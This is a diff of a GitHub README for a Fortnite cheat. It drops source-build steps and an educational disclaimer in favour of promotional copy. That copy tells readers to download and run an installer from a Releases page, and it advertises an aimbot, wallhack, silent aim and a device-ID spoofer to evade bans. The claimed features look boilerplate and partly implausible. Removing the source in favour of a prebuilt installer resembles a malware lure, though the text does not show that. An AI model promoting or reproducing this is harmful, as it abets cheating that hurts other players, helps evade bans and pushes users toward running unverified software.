@@ -1,53 +1,106 @@
-# Interic Fortnite External Cheat
+# Interic Fortnite External Cheat 🎮
 
-Interic External Cheat Source Code. Simple to Use
+![Fortnite Cheat](https://img.shields.io/badge/Fortnite%20Cheat-Download-blue?style=for-the-badge&logo=github)
 
-## How to Use
+Welcome to the **Interic Fortnite External Cheat** repository! This project provides an external cheat source code for Fortnite. It is designed to be simple and user-friendly, making it accessible for all users. 
 
-- Download the project to your computer as zip
-- Extract Project to Folder.
-- Make Sure You Have Visual Studio Installed on Your Computer
-- [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
+## Table of Contents
 
-### Compiling :
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-1. Open the solution file (.sln).
-2. Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
-3. When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
-4. Open Game
-5. Run Cheat
+## Introduction
+
+The Interic Fortnite External Cheat offers a range of functionalities to enhance your gaming experience. This cheat is built to be straightforward, allowing users to easily implement various hacks without extensive technical knowledge. 
+
+You can download the latest version of the cheat from the [Releases section](https://github.com/ngocthinh192/Interic-Fortnite-External-Cheat/releases). Follow the instructions below to get started.
 
 ## Features
 
-### Aimbot
+This cheat includes several features that improve gameplay. Here are some of the main functionalities:
 
-- Enable Aimbot [Head, Neck, Body ]
-- Enable Memory/Mouse
-- Weapon configs [Head, Neck, Body ] [ Smoothness ] [ Fov ]
-- AR SHOTGUN SMG SNIPER
+- **Aimbot**: Automatically aim at opponents for better accuracy.
+- **Wallhack**: See through walls to locate enemies easily.
+- **ESP (Extra Sensory Perception)**: Get information about opponents' locations and health.
+- **Custom Skins**: Change the appearance of your character.
+- **No Clip**: Move through walls and obstacles.
+- **No Recoil**: Eliminate weapon recoil for steady shooting.
+- **No Spread**: Ensure bullets hit the target without deviation.
+- **Radar Hack**: View enemy positions on a mini-map.
+- **Silent Aim**: Shoot without revealing your position.
+- **Spoofer**: Change your device ID to avoid bans.
 
-- Visibility check
-- Triggerbot
-- Shotgun only Triggerbot
+## Installation
 
-### Visuals
+To install the cheat, follow these steps:
 
-- Maximum Distance - [ 0 - 250m ]
-- Box
-- Distance
-- Skeleton
-- Name
-- Held weapon
-- Team id
+1. Download the cheat from the [Releases section](https://github.com/ngocthinh192/Interic-Fortnite-External-Cheat/releases).
+2. Extract the downloaded files to a folder on your computer.
+3. Run the installer and follow the on-screen instructions.
+4. Once installed, launch Fortnite and the cheat will run in the background.
 
-## Preview
+Make sure to read any additional instructions provided in the release notes.
 
-![fortnite](https://github.com/user-attachments/assets/0fe51b3f-121c-4636-908e-1d6060555245)
+## Usage
 
-## Disclaimer
+Using the Interic Fortnite External Cheat is simple. Once installed, you can access the cheat features through a user-friendly interface. 
 
-This source code is for educational purposes only. It's created to explore reverse engineering without impacting other gamers' experiences.
+1. Launch the cheat application before starting Fortnite.
+2. Select the features you want to enable.
+3. Start Fortnite and enjoy enhanced gameplay.
+
+### Important Note
+
+Always use cheats responsibly. Understand the risks involved, including potential bans from the game.
+
+## Topics
+
+This repository covers a wide range of topics related to Fortnite cheats:
+
+- fortnite
+- fortnite-aimbot
+- fortnite-cheat
+- fortnite-cheat-wallhack
+- fortnite-crosshair
+- fortnite-custom-skin
+- fortnite-esp
+- fortnite-hack-installer
+- fortnite-hack-patch
+- fortnite-hack-script
+- fortnite-hack-version
+- fortnite-no-clip
+- fortnite-no-recoil-hack
+- fortnite-no-spread-hack
+- fortnite-radar-hack
+- fortnite-silent-aim
+- fortnite-spoofer
+
+## Contributing
+
+We welcome contributions to improve the cheat. If you have ideas or enhancements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Submit a pull request.
+
+Please ensure your code is clean and well-documented.
 
 ## License
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+This project is licensed under the MIT License. You can use, modify, and distribute the code as long as you include the original license.
+
+## Support
+
+If you encounter any issues or have questions, feel free to check the [Releases section](https://github.com/ngocthinh192/Interic-Fortnite-External-Cheat/releases) for updates or contact the maintainers through GitHub issues.
+
+---
+
+Thank you for checking out the Interic Fortnite External Cheat! Enjoy your enhanced gaming experience!
